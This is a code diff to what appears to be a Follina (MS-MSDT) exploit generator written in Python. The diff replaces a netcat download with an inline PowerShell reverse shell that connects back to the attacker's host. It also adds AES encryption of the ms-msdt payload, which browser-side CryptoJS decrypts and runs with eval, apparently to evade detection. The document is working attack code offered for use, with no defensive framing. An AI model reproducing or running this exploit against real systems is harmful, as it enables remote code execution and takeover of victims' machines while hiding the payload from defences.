@@ -14,6 +14,10 @@ import socketserver
 import string
 import socket
 import threading
+import re
+from Crypto.Cipher import AES
+import Crypto.Cipher.AES
+import binascii
 
 parser = argparse.ArgumentParser()
 
@@ -94,7 +98,10 @@ def main(args):
         external_referral = filp.read()
 
     external_referral = external_referral.replace(
-        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
+        "{server_host}", f"{serve_host}"
+    )
+    external_referral = external_referral.replace(
+        "{server_port}", f"{args.port}"
     )
 
     with open(document_rels_path, "w") as filp:
@@ -108,18 +115,22 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
-
+        command = f"""$client = New-Object System.Net.Sockets.TCPClient("{serve_host}",{args.reverse});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+    #starting encrypting
+    print(f"[+] Encrypting script with AES")
+    script_payload = f"""location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
+    script_payload += "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
+    key = "".join([random.choice(string.ascii_lowercase) for _ in range(16)])
+    cipher = AES.new(key, AES.MODE_ECB)
+    enc_script = binascii.b2a_hex(cipher.encrypt(script_payload*16))
+    enc_script = enc_script.decode('utf-8')
 
     # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
-    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
-    html_payload += (
-        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
-        + "\n</script>"
-    )
-
+    html_payload = f"""<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/aes-min.js"></script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/mode-ecb-min.js"></script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/pad-nopadding-min.js"></script>\n"""
+    html_payload += f"""<script>\nvar encrypted = '{enc_script}',\nkey = CryptoJS.enc.Hex.parse('{''.join(hex(ord(x))[2:] for x in key)}'),\ncipherParams = CryptoJS.lib.CipherParams.create({{\nciphertext: CryptoJS.enc.Hex.parse(encrypted)\n}});\nvar decrypted3 = CryptoJS.AES.decrypt(cipherParams, key, {{mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.NoPadding }});\neval(CryptoJS.enc.Utf8.stringify(decrypted3));\n</script>"""
+    
     # Create our HTML endpoint
     with open(os.path.join(serve_path, "index.html"), "w") as filp:
         filp.write(html_payload)
